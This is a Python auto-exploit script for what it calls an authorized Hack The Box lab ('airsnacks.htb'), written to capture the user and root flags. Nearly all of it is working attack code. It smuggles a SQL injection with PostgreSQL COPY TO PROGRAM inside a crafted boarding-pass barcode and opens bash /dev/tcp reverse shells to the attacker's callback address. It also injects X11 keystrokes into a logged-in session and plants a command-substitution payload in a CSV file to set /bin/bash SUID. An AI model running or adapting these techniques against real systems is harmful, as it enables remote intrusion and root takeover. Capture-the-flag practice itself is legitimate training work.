#!/usr/bin/env python3
"""End-to-end exploit for the authorized HTB AirSnacks/DutyBound lab.

Usage: python3 airsnacks_autopwn.py --target-ip <target-IP> --callback-ip <your-IP>

This script is specific to airsnacks.htb. It uses the known BCBP SQL injection,
an X11 keystroke handoff, and the watched duty-rates.csv issue. Run it only
against the assigned lab instance from a Linux host connected to HTB.
"""

import argparse
import base64
import ipaddress
import json
import os
import re
import shutil
import shlex
import socket
import subprocess
import sys
import tempfile
import time

HOSTNAME = "airsnacks.htb"
FIRST_PORT = 4445
SECOND_PORT = 4446
HTTP_TIMEOUT = 5
SHELL_TIMEOUT = 25


def say(message):
    print(f"[*] {message}", flush=True)


def fail(message):
    print(f"[!] {message}", file=sys.stderr, flush=True)
    raise SystemExit(1)


def make_listener(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    server.settimeout(SHELL_TIMEOUT)
    return server


def accept_shell(server, label):
    say(f"Waiting for the {label} shell on port {server.getsockname()[1]}...")
    try:
        conn, peer = server.accept()
    except socket.timeout:
        fail(f"No connection received for {label} after {SHELL_TIMEOUT}s.")
    finally:
        server.close()
    conn.settimeout(1.0)
    say(f"Connection received from {peer[0]}:{peer[1]} ({label}).")
    return conn


def receive_until(sock, marker, timeout=15):
    marker_bytes = marker.encode()
    deadline = time.monotonic() + timeout
    data = bytearray()
    while marker_bytes not in data:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError(
                f"Marker {marker!r} not found. Data received:\n"
                + data.decode(errors="replace")
            )
        sock.settimeout(min(1.0, remaining))
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue
        if not chunk:
            raise ConnectionError("The remote shell closed the connection.")
        data.extend(chunk)
    return data.decode(errors="replace")


def shell_command(sock, command, timeout=15):
    marker = "__DONE_" + os.urandom(6).hex() + "__"
    sock.sendall(
        (command + f"\nprintf '\\n{marker}\\n'\n").encode()
    )
    return receive_until(sock, marker, timeout)


def send_script(sock, script, timeout=20):
    marker = "__SCRIPT_" + os.urandom(6).hex() + "__"
    sock.sendall(
        (script.rstrip() + f"\nprintf '\\n{marker}\\n'\n").encode()
    )
    return receive_until(sock, marker, timeout)


def curl_post(target_ip, path, body, cookie_file, max_time=HTTP_TIMEOUT):
    """Use curl --resolve so both HTTPS SNI and HTTP Host use airsnacks.htb."""
    command = [
        "curl", "--silent", "--show-error", "--insecure",
        "--resolve", f"{HOSTNAME}:443:{target_ip}",
        "--cookie", cookie_file, "--cookie-jar", cookie_file,
        "--header", "Content-Type: application/json",
        "--data-binary", json.dumps(body, separators=(",", ":")),
        "--max-time", str(max_time),
        "--write-out", "\n__HTTP_STATUS__:%{http_code}",
        f"https://{HOSTNAME}{path}",
    ]
    try:
        result = subprocess.run(
            command, capture_output=True, text=True, timeout=max_time + 3
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired as exc:
        out = exc.stdout or ""
        err = exc.stderr or ""
        if isinstance(out, bytes):
            out = out.decode(errors="replace")
        if isinstance(err, bytes):
            err = err.decode(errors="replace")
        return 28, out, err or "curl timed out"


def build_bcbp(airline_use):
    fixed = (
        "M1"
        + "DOE/JANE".ljust(20)
        + "E"
        + "ABC1234"
        + "LHR"
        + "JFK"
        + "AA "
        + "0123 "
        + "123"
        + "Y"
        + "012A"
        + "0000A"
        + "1"
    )
    unique = "0WW2026BAA "
    repeated = (
        "001" + "0000000001" + "0" + "0"
        + "AA " + "AA " + "1234567890123456"
    )
    conditional = ">5" + "0B" + unique + "25" + repeated + airline_use
    if len(conditional) > 255:
        fail("The BCBP data field exceeds the length encoded by two hexadecimal digits.")
    return fixed + f"{len(conditional):02X}" + conditional


def trigger_postgres_shell(target_ip, callback_ip, cookie_file):
    listener = make_listener(FIRST_PORT)
    command = "bash -c 'bash -i >& /dev/tcp/" + callback_ip + f"/{FIRST_PORT} 0>&1'"
    encoded = base64.b64encode(command.encode()).decode()
    airline = (
        "A');COPY (SELECT '') TO PROGRAM "
        f"'echo {encoded} | base64 -d | bash';--"
    )
    raw = build_bcbp(airline)

    say("Creating the BER-PBR-4 cart.")
    code, output, error = curl_post(
        target_ip, "/cart/add", {"sku": "BER-PBR-4"}, cookie_file
    )
    if code not in (0,):
        listener.close()
        fail(f"Cart creation failed (curl={code}). {error} {output}")

    say("Sending the BCBP containing the SQL payload.")
    code, output, error = curl_post(
        target_ip,
        "/checkout/boarding-pass/verify",
        {"raw": raw},
        cookie_file,
        max_time=HTTP_TIMEOUT,
    )
    if code == 28:
        say("HTTP request timed out during launch. Waiting for the reverse shell.")
    elif code != 0:
        say(f"curl exited with code {code}. Checking for the reverse connection.")
    else:
        status = re.search(r"__HTTP_STATUS__:(\d{3})", output)
        say("Verification request sent" + (f" (HTTP {status.group(1)})." if status else "."))

    return accept_shell(listener, "postgres")


def x11_script(callback_ip):
    return f'''cat > /tmp/type_x11.py <<'PY'
import time
from Xlib import X, XK, display
from Xlib.ext import xtest

d = display.Display(":0")
mapping = {{
    " ": "space", ".": "period", "/": "slash", ":": "colon",
    "&": "ampersand", ">": "greater", "'": "apostrophe",
    "-": "minus", "_": "underscore", "(": "parenleft",
    ")": "parenright", "=": "equal", ";": "semicolon", "|": "bar",
}}

def key(name, down):
    code = d.keysym_to_keycode(XK.string_to_keysym(name))
    xtest.fake_input(d, X.KeyPress if down else X.KeyRelease, code)
    d.sync()

def type_char(c):
    shifted = c.isupper() or c in "&>:_"
    name = mapping.get(c.lower() if c.isupper() else c)
    if name is None:
        name = c.lower() if c.isupper() else c
    if shifted:
        key("Shift_L", True)
    key(name, True)
    key(name, False)
    if shifted:
        key("Shift_L", False)

key("Control_L", True)
key("Alt_L", True)
key("t", True)
key("t", False)
key("Alt_L", False)
key("Control_L", False)
d.sync()
time.sleep(2)

cmd = "bash -c 'bash -i >& /dev/tcp/{callback_ip}/{SECOND_PORT} 0>&1'"
for char in cmd:
    type_char(char)
key("Return", True)
key("Return", False)
d.sync()
PY
python3 /tmp/type_x11.py'''


def get_original_csv(sock):
    begin = "__CSV_BEGIN_" + os.urandom(4).hex() + "__"
    end = "__CSV_END_" + os.urandom(4).hex() + "__"
    output = shell_command(
        sock,
        f"printf '{begin}'; base64 -w0 /opt/vrs/data/duty-rates.csv; printf '{end}'",
    )
    match = re.search(re.escape(begin) + r"([A-Za-z0-9+/=]+)" + re.escape(end), output)
    if not match:
        raise RuntimeError("Could not retrieve the original CSV using base64.")
    return base64.b64decode(match.group(1)).decode()


def main():
    parser = argparse.ArgumentParser(
        description="Exploit for the authorized HTB AirSnacks/DutyBound lab."
    )
    parser.add_argument(
        "--target-ip", required=True,
        help="IP address of the authorized HTB target",
    )
    parser.add_argument(
        "--callback-ip", required=True,
        help="IP address of your machine, reachable from the target",
    )
    args = parser.parse_args()

    try:
        target_ip = str(ipaddress.ip_address(args.target_ip))
    except ValueError:
        fail("--target-ip must be a valid IPv4 or IPv6 address.")
    try:
        callback_ip = str(ipaddress.ip_address(args.callback_ip))
    except ValueError:
        fail("--callback-ip must be a valid IPv4 or IPv6 address.")
    if ":" in target_ip or ":" in callback_ip:
        fail("This version uses IPv4 for reverse connections.")

    if not shutil.which("curl"):
        fail("curl is required on the attacking machine.")

    say(f"Target: {target_ip}, HTTPS vhost: {HOSTNAME}")
    say(f"Provided callback address: {callback_ip}")
    say("Make sure this address is reachable from the HTB target.")

    with tempfile.TemporaryDirectory(prefix="airsnacks-") as temp_dir:
        cookie_file = os.path.join(temp_dir, "cookies.txt")
        open(cookie_file, "w").close()
        try:
            postgres = trigger_postgres_shell(target_ip, callback_ip, cookie_file)
        except Exception as exc:
            fail(f"Postgres stage failed: {exc}")

        try:
            say("Verifying the postgres shell.")
            postgres_output = shell_command(postgres, "id; hostname; pwd")
            if "uid=114(postgres)" not in postgres_output:
                fail("The received connection does not appear to be a postgres shell.")
            say("Postgres shell confirmed on dutyfree-kiosk7.")

            say("Checking X11 access and pos-ops group membership.")
            x11_output = shell_command(
                postgres,
                "id; ls -l /tmp/.X11-unix/X0; DISPLAY=:0 xdpyinfo >/dev/null 2>&1; echo X11_STATUS=$?; python3 -c 'from Xlib.ext import xtest; print(\"XTEST_READY\")'",
            )
            if "X11_STATUS=0" not in x11_output or "XTEST_READY" not in x11_output:
                fail("The X11 session or XTEST module is unavailable.")
            say("X11 display :0 is accessible and XTEST is available.")

            second_listener = make_listener(SECOND_PORT)
            script = x11_script(callback_ip)
            say("Sending the XTEST script to the kiosk graphical session.")
            send_script(postgres, script, timeout=20)
            user_shell = accept_shell(second_listener, "dutyfree-kiosk")

            say("Verifying the kiosk account and reading the user flag.")
            user_output = shell_command(
                user_shell,
                "id; printf 'USER_FLAG='; cat /home/dutyfree-kiosk/user.txt",
            )
            user_match = re.search(r"USER_FLAG=([0-9a-fA-F]+)", user_output)
            if not user_match:
                fail("The kiosk shell is open, but the user flag could not be extracted.")
            if "uid=1000(dutyfree-kiosk)" not in user_output:
                fail("The received connection is not confirmed as dutyfree-kiosk.")
            say("dutyfree-kiosk shell confirmed.")

            say("Backing up the CSV before modification.")
            original_csv = get_original_csv(user_shell)
            encoded_csv = base64.b64encode(original_csv.encode()).decode()
            say("Original CSV contents saved in memory.")

            say("Adding the tax_class value that triggers eval in the root service.")
            trigger = "probe[$(chmod u+s /bin/bash)0],1,1"
            shell_command(
                user_shell,
                "printf '%s\\n' " + repr(trigger) + " >> /opt/vrs/data/duty-rates.csv",
            )

            root_script = (
                "if [ \"$EUID\" -ne 0 ]; then echo ROOT_ESCALATION_FAILED; exit 1; fi; "
                "id; "
                "printf 'USER_FLAG='; cat /home/dutyfree-kiosk/user.txt; "
                "printf 'ROOT_FLAG='; cat /root/root.txt; "
                f"printf %s {encoded_csv} | base64 -d > /opt/vrs/data/duty-rates.csv; "
                "chmod 755 /bin/bash"
            )
            command = (
                "for i in $(seq 1 40); do [ -u /bin/bash ] && break; sleep 0.5; done; "
                "/bin/bash -p -c " + shlex.quote(root_script)
            )
            say("Waiting for the systemd service, then reading the flags as root.")
            root_output = shell_command(user_shell, command, timeout=30)

            root_match = re.search(r"ROOT_FLAG=([0-9a-fA-F]+)", root_output)
            if not root_match:
                fail(
                    "The root flag could not be extracted. The service may not have triggered. "
                    "Check the CSV and /bin/bash permissions manually."
                )

            print("\n[+] Results")
            say("Root shell confirmed. CSV and permissions restored.")
            print("USER_FLAG=" + user_match.group(1))
            print("ROOT_FLAG=" + root_match.group(1))
        finally:
            postgres.close()
            try:
                user_shell.close()
            except (NameError, OSError):
                pass


if __name__ == "__main__":
    main()
